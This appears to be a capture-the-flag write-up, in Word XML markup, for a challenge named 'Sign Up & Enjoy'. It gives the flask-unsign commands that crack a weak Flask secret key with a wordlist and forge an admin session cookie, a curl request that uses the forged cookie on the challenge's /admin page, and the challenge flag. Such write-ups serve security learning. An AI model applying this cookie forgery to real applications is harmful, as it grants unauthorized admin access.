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CTF Write-Up: Sign Up &amp; Enjoy (Flask Cookie Forgery)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Challenge Info</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Name: Sign Up &amp; Enjoy</w:t>
        <w:br/>
        <w:t>Points: 895</w:t>
        <w:br/>
        <w:t>Vulnerability: Weak Flask Secret Key (Session Cookie Forgery)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Overview</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>This challenge exploits a weak Flask secret key to forge session cookies and gain admin access.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Steps</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>1. Created an account and logged in.</w:t>
        <w:br/>
        <w:t>2. Found /admin endpoint but access was denied.</w:t>
        <w:br/>
        <w:t>3. Discovered /tools/link-preview (potential SSRF).</w:t>
        <w:br/>
        <w:t>4. Used SSRF to access internal endpoint /internal.</w:t>
        <w:br/>
        <w:t>5. Inspected session cookie (Flask signed cookie).</w:t>
        <w:br/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Cookie Analysis</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Decoded cookie payload revealed:</w:t>
        <w:br/>
        <w:t>{"role":"standard","uid":"u_ffe73768","username":"bvr4j"}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Cracking Secret Key</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Used flask-unsign with rockyou wordlist:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>flask-unsign --unsign --cookie 'eyJ...' --wordlist /usr/share/wordlists/rockyou.txt --no-literal-eval</w:t>
        <w:br/>
        <w:t># Found: Password1!</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Forge Admin Cookie</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>flask-unsign --sign --cookie '{"role":"admin","uid":"u_ffe73768","username":"bvr4j"}' --secret 'Password1!'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Access Admin Panel</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>curl -s http://23.179.17.92:5557/admin -H 'Cookie: session=FORGED_COOKIE'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Flag</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>CIT{W3ak_S3cr3t5_C@n_B3_Un5ign3d}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